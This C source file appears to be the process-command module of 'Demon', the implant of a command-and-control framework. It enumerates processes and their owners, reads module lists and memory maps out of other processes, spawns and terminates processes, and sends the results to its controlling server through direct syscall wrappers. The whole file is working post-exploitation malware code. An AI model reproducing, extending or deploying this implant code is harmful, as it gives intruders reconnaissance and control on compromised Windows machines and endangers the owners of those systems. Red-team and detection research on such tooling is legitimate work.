#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>
#include <commands/Command_Proc.h>

VOID CommandProc( PPARSER Parser )
{
    SHORT       SubCommand  = ( SHORT ) ParserGetInt32( Parser );
    PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );

    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {
        case DEMON_COMMAND_PROC_MODULES: PUTS( "Proc::Modules" )
        {
            PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
            UINT32                    ProcessID        = 0;
            HANDLE                    hProcess         = NtCurrentProcess();
            BOOL                      OpenedHandle     = FALSE;
            NTSTATUS                  NtStatus         = STATUS_SUCCESS;

            if ( Parser->Length > 0 ) {
                ProcessID = ParserGetInt32( Parser );
                hProcess  = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
                if ( ! hProcess ) {
                    PACKAGE_ERROR_WIN32
                    break;
                }
                OpenedHandle = TRUE;
            }

            NtStatus = SysNtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
            if ( NT_SUCCESS( NtStatus ) )
            {
                PPEB_LDR_DATA           LoaderData              = NULL;
                PLIST_ENTRY             ListHead, ListEntry     = NULL;
                SIZE_T                  Size                    = 0;
                LDR_DATA_TABLE_ENTRY    CurrentModule           = { 0 };
                WCHAR                   ModuleNameW[ MAX_PATH ] = { 0 };
                CHAR                    ModuleName[ MAX_PATH ]  = { 0 };

                PackageAddInt32( Package, ProcessID );

                if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                {
                    ListHead = & LoaderData->InMemoryOrderModuleList;

                    Size = 0;
                    if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
                    {
                        while ( ListEntry != ListHead )
                        {
                            if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
                            {
                                SysNtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );

                                if ( CurrentModule.FullDllName.Length > 0 ) {
                                    Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );

                                    PackageAddString( Package, ModuleName );
                                    PackageAddPtr( Package, CurrentModule.DllBase );
                                }

                                MemSet( ModuleNameW, 0, MAX_PATH );
                                MemSet( ModuleName, 0, MAX_PATH );

                                ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
                            }
                        }
                    }
                }
            }

            /* only close real handles; NtCurrentProcess() is a pseudo-handle */
            if ( OpenedHandle && hProcess ) {
                SysNtClose( hProcess );
            }

            break;
        }

        case DEMON_COMMAND_PROC_GREP: PUTS("Proc::Grep")
        {
            PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
            PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
            SIZE_T                      ProcessInfoSize = 0;
            NTSTATUS                    NtStatus        = STATUS_SUCCESS;
            ULONG32                     ProcessSize     = 0;
            PWCHAR                      ProcessName     = NULL;

            /* Process User token */
            BUFFER UserDomain = { 0 };

            ProcessName = ParserGetWString( Parser, &ProcessSize );

            if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
            {
                PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );

                /* save the original pointer to free */
                PtrProcessInfo = SysProcessInfo;

                while ( TRUE )
                {
                    PVOID MemRet = WcsIStr( SysProcessInfo->ImageName.Buffer, ProcessName );

                    if ( MemRet != NULL )
                    {
                        HANDLE hProcess = NULL;
                        HANDLE hToken   = NULL;

                        hProcess = ProcessOpen( U_PTR( SysProcessInfo->UniqueProcessId ) , ( Instance->Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
                        if ( ! hProcess )
                            continue;

                        if ( NT_SUCCESS( SysNtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) ) {
                            if ( TokenQueryOwner( hToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                                /* well successful called the token user/domain query. continue */
                            }
                        }

                        PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );
                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
                        PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
                        PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );

                        if ( hProcess ) {
                            SysNtClose( hProcess );
                            hProcess = NULL;
                        }

                        if ( hToken ) {
                            SysNtClose( hToken );
                            hToken = NULL;
                        }

                        if ( UserDomain.Buffer ) {
                            MemZero( UserDomain.Buffer, UserDomain.Length );
                            MmHeapFree( UserDomain.Buffer );
                            UserDomain.Buffer = NULL;
                        }
                    }

                    if ( SysProcessInfo->NextEntryOffset == 0 )
                        break;

                    SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
                }

                if ( PtrProcessInfo )
                {
                    MemSet( PtrProcessInfo, 0, ProcessInfoSize );
                    MmHeapFree( PtrProcessInfo );
                    PtrProcessInfo = NULL;
                    SysProcessInfo = NULL;
                }
            }
            else
            {
                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                CALLBACK_ERROR_WIN32;
            }

            break;
        }

        case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )
        {
            PROCESS_INFORMATION ProcessInfo     = { 0 };
            UINT32              ProcessSize     = 0;
            UINT32              ProcessArgsSize = 0;
            UINT32              ProcessState    = ParserGetInt32( Parser );
            PWCHAR              Process         = ParserGetWString( Parser, &ProcessSize );
            PWCHAR              ProcessArgs     = ParserGetWString( Parser, &ProcessArgsSize );
            BOOL                ProcessPiped    = ParserGetInt32( Parser );
            BOOL                ProcessVerbose  = ParserGetInt32( Parser );
            BOOL                Success         = FALSE;

            if ( ProcessSize == 0 )
                Process = NULL;

            if ( ProcessArgsSize == 0 )
                ProcessArgs = NULL;

            PRINTF( "Process State   : %d\n", ProcessState );
            PRINTF( "Process         : %ls [%d]\n", Process, ProcessSize );
            PRINTF( "Process Args    : %ls [%d]\n", ProcessArgs, ProcessArgsSize );
            PRINTF( "Process Piped   : %s [%d]\n", ProcessPiped ? "TRUE" : "FALSE", ProcessPiped );
            PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );

            // TODO: make it optional to choose process arch
            Success = ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL );

            PackageAddWString( Package, Process );
            PackageAddInt32( Package, Success ? ProcessInfo.dwProcessId : 0 );
            PackageAddInt32( Package, Success );
            PackageAddInt32( Package, ProcessPiped );
            PackageAddInt32( Package, ProcessVerbose );

            if ( Success )
            {
                SysNtClose( ProcessInfo.hThread );
                if ( ! ProcessPiped )
                    SysNtClose( ProcessInfo.hProcess );

                PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
            }

            break;
        }

        case DEMON_COMMAND_PROC_MEMORY: PUTS( "Proc::Memory" )
        {
            DWORD                    ProcessID   = ParserGetInt32( Parser );
            DWORD                    QueryProtec = ParserGetInt32( Parser );
            MEMORY_BASIC_INFORMATION MemInfo     = {};
            LPVOID                   Offset      = 0;
            SIZE_T                   Result      = 0;
            HANDLE                   hProcess    = NULL;

            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
            if ( hProcess )
            {
                PackageAddInt32( Package, ProcessID );
                PackageAddInt32( Package, QueryProtec );

                while ( NT_SUCCESS( SysNtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                {
                    Offset = C_PTR( U_PTR( MemInfo.BaseAddress ) + MemInfo.RegionSize );

                    if ( MemInfo.Type != MEM_FREE )
                    {
                        if ( MemInfo.AllocationBase != 0 )
                        {
                            if ( QueryProtec == 0 )
                            {
                                // Since the Protection to query isn't specified we just list every memory region
                                PackageAddPtr( Package, MemInfo.BaseAddress );
                                PackageAddInt32( Package, MemInfo.RegionSize );
                                PackageAddInt32( Package, MemInfo.AllocationProtect );
                                PackageAddInt32( Package, MemInfo.State );
                                PackageAddInt32( Package, MemInfo.Type );
                            }
                            else
                            {
                                if ( QueryProtec == MemInfo.AllocationProtect )
                                {
                                    PRINTF( "Search for memory region: %d\n", QueryProtec )
                                    // Add found memory region with specified memory protection
                                    PackageAddPtr( Package, MemInfo.BaseAddress );
                                    PackageAddInt32( Package, MemInfo.RegionSize );
                                    PackageAddInt32( Package, MemInfo.AllocationProtect );
                                    PackageAddInt32( Package, MemInfo.State );
                                    PackageAddInt32( Package, MemInfo.Type );
                                }
                            }
                        }
                    }
                }

                Offset = NULL;
            }

            if ( hProcess ) {
                SysNtClose( hProcess );
                hProcess = NULL;
            }

            break;
        }

        case DEMON_COMMAND_PROC_KILL: PUTS( "Proc::Kill" )
        {
            DWORD  dwProcessID = ParserGetInt32( Parser );
            HANDLE hProcess    = NULL;

            hProcess = ProcessOpen( dwProcessID, PROCESS_TERMINATE );
            if ( hProcess )
                Instance->Win32.TerminateProcess( hProcess, 0 );

            PackageAddInt32( Package, hProcess ? TRUE : FALSE );
            PackageAddInt32( Package, dwProcessID );

            if ( hProcess )
            {
                SysNtClose( hProcess );
                hProcess = NULL;
            }

            break;
        }
    }

    // TODO: handle error
    PackageTransmit( Package );
}

/*!
 * get current list of running processes
 * and sends it back to the server.
 *
 * TODO: refactor this.
 *
 * @param Parser
 */
VOID CommandProcList(
    IN PPARSER Parser
) {
    PSYS_PROC_INFO SysProcessInfo  = { 0 };
    PSYS_PROC_INFO SysProcessPtr   = { 0 }; /* is going to hold the original pointer of SysProcessInfo */
    SIZE_T         ProcessInfoSize = { 0 };
    PPACKAGE       Package         = { 0 };
    DWORD          ProcessUI       = { 0 };
    HANDLE         Token           = { 0 };
    HANDLE         Process         = { 0 };
    BUFFER         UserDomain      = { 0 };
    BOOL           x86             = FALSE;
    NTSTATUS       NtStatus        = STATUS_SUCCESS;

    /* try to take a snapshot of current running processes */
    if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
    {
        PRINTF( "SysProcessInfo: %p : %d\n", SysProcessInfo, ProcessInfoSize );

        /* save the original pointer to free */
        SysProcessPtr = SysProcessInfo;

        /* Create our package */
        Package   = PackageCreate( DEMON_COMMAND_PROC_LIST );
        ProcessUI = ParserGetInt32( Parser ); /* TODO: change from bool to process list id (what client requested it) */

        /* did we get this request from the Client Process Explorer or Console ? */
        PackageAddInt32( Package, ProcessUI );

        do {
            /* open handle to each process with query information privilege since we don't need anything else besides basic info */
            Process = ProcessOpen(
                U_PTR( SysProcessInfo->UniqueProcessId ),
                Instance->Session.OSVersion > WIN_VERSION_XP ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION
            );

            /* query data based on the process handle */
            if ( Process )
            {
                /* open a process token handle */
                if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( Process, TOKEN_QUERY, &Token ) ) ) {
                    /* query the username and domain */
                    if ( ! TokenQueryOwner( Token, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                        PUTS( "Failed to get Username and Domain\n" );
                    } else {
                        PRINTF( "UserDomain: %ls\n", UserDomain.Buffer )
                    }
                } else {
                    PRINTF( "NtOpenProcessToken Failed => %lx\n", NtStatus )
                }

                /* check if the process handle is wow64 */
                x86 = ProcessIsWow( Process );
            }

            /* Now we append the collected process data to the process list  */
            PackageAddBytes( Package, (PBYTE) SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
            PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
            PackageAddInt32( Package, x86 );
            PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
            PackageAddInt32( Package, SysProcessInfo->SessionId );
            PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
            PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );

#ifdef DEBUG
            /* ignore this. is just for the debug prints.
             * if we close the handle to our own process we won't see any debug prints anymore */
            if ( U_PTR( SysProcessInfo->UniqueProcessId ) != Instance->Session.PID ) {
                SysNtClose( Process );
                Process = NULL;
            }
#else
            if ( Process ) {
                SysNtClose( Process );
                Process = NULL;
            }
#endif

            if ( Token ) {
                SysNtClose( Token );
                Token = NULL;
            }

            if ( UserDomain.Buffer ) {
                MemZero( UserDomain.Buffer, UserDomain.Length );
                MmHeapFree( UserDomain.Buffer );
                UserDomain.Buffer = NULL;
                UserDomain.Length = 0;
            }

            /* there are no processes left. */
            if ( ! SysProcessInfo->NextEntryOffset ) {
                break;
            }

            /* now go to the next process */
            SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
        } while ( TRUE );

        PackageTransmit( Package );

        /* Free our process list */
        if ( SysProcessPtr ) {
            MemZero( SysProcessPtr, ProcessInfoSize );
            MmHeapFree( SysProcessPtr );
            SysProcessPtr  = NULL;
            SysProcessInfo = NULL;
        }
    } else {
        PACKAGE_ERROR_NTSTATUS( NtStatus )
    }
}
